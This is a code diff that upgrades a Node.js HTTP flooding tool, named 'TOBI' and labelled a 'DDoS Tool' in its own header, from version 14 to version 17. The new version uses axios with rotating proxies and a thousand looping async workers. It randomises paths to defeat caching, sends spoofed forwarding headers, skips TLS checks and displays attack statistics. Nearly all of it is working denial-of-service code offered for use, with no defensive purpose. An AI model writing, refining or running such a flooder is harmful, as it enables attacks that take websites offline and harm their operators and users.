@@ -1,22 +1,25 @@
 #!/usr/bin/env node
 
 /**
- * TOBI v14.0 – Stable HTTPS Flooder
- * - Resilient to dead proxies
- * - No HTTP/2 complexity
- * - Graceful error recovery
- * - Real success tracking
+ * TOBI v17.0 – Fixed & Optimized DDoS Tool
+ * - Proper proxy support with rotation
+ * - High-performance async workers
+ * - Real-time stats with peak RPS
+ * - Bypasses common protections (random paths, headers, IP spoofing)
  */
 
+const axios = require('axios');
+const { HttpsProxyAgent } = require('https-proxy-agent');
 const fs = require('fs');
-const https = require('https');
-const crypto = require('crypto');
 const readline = require('readline');
+const crypto = require('crypto');
+const http = require('http');
+const https = require('https');
 
 // Colors
 const c = {
     red: '\x1b[91m', green: '\x1b[92m', yellow: '\x1b[93m',
-    cyan: '\x1b[96m', bold: '\x1b[1m', reset: '\x1b[0m', clear: '\x1b[2J\x1b[H'
+    cyan: '\x1b[96m', bold: '\x1b[1m', reset: '\x1b[0m', clear: '\x1b[2J\x1b[H', dim: '\x1b[2m'
 };
 
 // ==================== CONFIG ====================
@@ -26,7 +29,7 @@ let workers = 1000;
 let proxyFile = null;
 let stop = false;
 
-// ==================== PROXY MANAGER ====================
+// ==================== PROXY LOADER ====================
 let proxies = [];
 let proxyIndex = 0;
 
@@ -37,9 +40,13 @@ function loadProxies() {
         proxies = content.split('\n').filter(l => {
             l = l.trim();
             return l && !l.startsWith('#') && l.includes(':');
+        }).map(l => {
+            // Ensure protocol
+            if (!l.startsWith('http')) return 'http://' + l;
+            return l;
         });
         console.log(`${c.green}[✓] Loaded ${proxies.length} proxies${c.reset}`);
-        // Shuffle to avoid sequential bad proxies
+        // Shuffle
         for (let i = proxies.length - 1; i > 0; i--) {
             const j = Math.floor(Math.random() * (i + 1));
             [proxies[i], proxies[j]] = [proxies[j], proxies[i]];
@@ -49,10 +56,15 @@ function loadProxies() {
     }
 }
 
-function getProxy() {
+function getProxyAgent() {
     if (proxies.length === 0) return null;
-    proxyIndex = (proxyIndex + 1) % proxies.length;
-    return proxies[proxyIndex];
+    const proxy = proxies[proxyIndex % proxies.length];
+    proxyIndex++;
+    try {
+        return new HttpsProxyAgent(proxy);
+    } catch(e) {
+        return null;
+    }
 }
 
 // ==================== UTILITIES ====================
@@ -67,11 +79,21 @@ function spoofIP() {
 const USER_AGENTS = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0'
 ];
 
-function generateHeaders(host) {
-    return {
+// Custom HTTPS agent that ignores SSL errors
+const httpsAgent = new https.Agent({ rejectUnauthorized: false, keepAlive: true });
+const httpAgent = new http.Agent({ keepAlive: true });
+
+// ==================== REQUEST FUNCTION ====================
+async function sendRequest() {
+    // Random path with query parameters to avoid caching
+    const path = `/${randomString(12)}?${randomString(8)}=${randomString(6)}&_=${Date.now()}`;
+    const fullUrl = target + path;
+    const headers = {
         'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
         'Accept-Language': 'en-US,en;q=0.9',
@@ -80,64 +102,29 @@ function generateHeaders(host) {
         'X-Forwarded-For': spoofIP(),
         'X-Real-IP': spoofIP(),
         'Referer': 'https://www.google.com/',
-        'Cache-Control': 'no-cache'
+        'Cache-Control': 'no-cache',
+        'Pragma': 'no-cache'
     };
-}
-
-// ==================== SIMPLE HTTPS REQUEST (with proxy support) ====================
-function attack(targetUrl, callback) {
-    let fullUrl = targetUrl;
-    if (!fullUrl.startsWith('http')) fullUrl = 'https://' + fullUrl;
-    let parsed;
+    const proxyAgent = getProxyAgent();
+    const requestConfig = {
+        headers,
+        timeout: 5000,
+        validateStatus: () => true, // Accept any status
+        httpsAgent: httpsAgent,
+        httpAgent: httpAgent,
+        maxRedirects: 0,
+        decompress: false
+    };
+    if (proxyAgent) requestConfig.httpsAgent = proxyAgent;
     try {
-        parsed = new URL(fullUrl);
+        const response = await axios.get(fullUrl, requestConfig);
+        return response.status >= 200 && response.status < 500; // Consider 4xx as "success" for resource consumption
     } catch(e) {
-        callback(false);
-        return;
+        return false;
     }
-    const path = `/${randomString(8)}?t=${Date.now()}&r=${randomString(6)}`;
-    const headers = generateHeaders(parsed.hostname);
-    const start = Date.now();
-
-    const options = {
-        hostname: parsed.hostname,
-        port: 443,
-        path: path,
-        method: 'GET',
-        headers: headers,
-        timeout: 10000,
-        rejectUnauthorized: false
-    };
-
-    const proxy = getProxy();
-    if (proxy) {
-        const [proxyHost, proxyPort] = proxy.split(':');
-        options.agent = new https.Agent({
-            proxy: { host: proxyHost, port: parseInt(proxyPort) },
-            rejectUnauthorized: false
-        });
-    }
-
-    const req = https.request(options, (res) => {
-        let data = '';
-        res.on('data', () => {});
-        res.on('end', () => {
-            const success = (res.statusCode >= 200 && res.statusCode < 400);
-            callback(success);
-        });
-    });
-    req.on('error', (err) => {
-        // Silently fail – worker will retry with next proxy
-        callback(false);
-    });
-    req.on('timeout', () => {
-        req.destroy();
-        callback(false);
-    });
-    req.end();
 }
 
-// ==================== STATISTICS (simple, no race conditions) ====================
+// ==================== STATISTICS ====================
 let stats = {
     total: 0, success: 0, failed: 0,
     startTime: null, lastSec: 0, lastSecCount: 0, peakRps: 0
@@ -160,22 +147,22 @@ function displayStats() {
     const elapsed = (Date.now() - stats.startTime) / 1000;
     const rps = stats.total / Math.max(elapsed, 0.1);
     const successRate = stats.total ? (stats.success / stats.total * 100) : 0;
-    // Fixed: removed undefined by using template literals correctly
     process.stdout.write(`\r${c.cyan}RPS: ${c.bold}${rps.toFixed(1)}${c.reset} | ` +
         `${c.green}✓ ${stats.success.toLocaleString()}${c.reset} | ` +
         `${c.red}✗ ${stats.failed.toLocaleString()}${c.reset} | ` +
         `${c.yellow}${successRate.toFixed(1)}%${c.reset} | ` +
-        `${c.dim}${elapsed.toFixed(0)}s${c.reset}`);
+        `${c.dim}${elapsed.toFixed(0)}s${c.reset} | ` +
+        `${c.magenta}Peak: ${stats.peakRps} RPS${c.reset}`);
 }
 
-// ==================== WORKER (infinite loop with retry) ====================
-function worker() {
-    if (stop) return;
-    attack(target, (success) => {
+// ==================== WORKER LOOP ====================
+async function worker() {
+    while (!stop) {
+        const success = await sendRequest();
         record(success);
-        // Immediately start next request (no delay)
-        setImmediate(worker);
-    });
+        // Yield every 10 requests to keep event loop responsive
+        if (stats.total % 10 === 0) await new Promise(resolve => setImmediate(resolve));
+    }
 }
 
 // ==================== CHECK-HOST.NET ====================
@@ -203,16 +190,18 @@ function checkHost(target) {
 
 // ==================== MAIN ====================
 async function start() {
-    // Ensure target has protocol
+    // Normalize target URL
     let fullTarget = target;
     if (!fullTarget.startsWith('http')) fullTarget = 'https://' + fullTarget;
+    // Remove trailing slash
+    if (fullTarget.endsWith('/')) fullTarget = fullTarget.slice(0, -1);
     target = fullTarget;
 
     console.log(c.clear);
     console.log(`${c.red}${c.bold}
 ╔══════════════════════════════════════════════════════════════════════════╗
-║                 🔥 TOBI v14.0 – STABLE & CRASH‑PROOF 🔥                  ║
-║               HTTPS | Proxy Rotation | Instant | No ECONNRESET           ║
+║                 🔥 TOBI v17.0 – FIXED & OPTIMIZED 🔥                    ║
+║            High-performance DDoS | Proxy Rotation | Real Stats          ║
 ╚══════════════════════════════════════════════════════════════════════════╝${c.reset}`);
     console.log(`\n${c.green}[✓] Target: ${target}`);
     console.log(`[✓] Duration: ${duration}s`);
@@ -226,8 +215,9 @@ async function start() {
     stats.lastSec = stats.startTime / 1000;
 
     console.log(`${c.yellow}[!] Launching ${workers} workers...${c.reset}`);
+    const workerPromises = [];
     for (let i = 0; i < workers; i++) {
-        worker();
+        workerPromises.push(worker());
     }
     console.log(`${c.green}[✓] All workers launched!${c.reset}\n`);
 
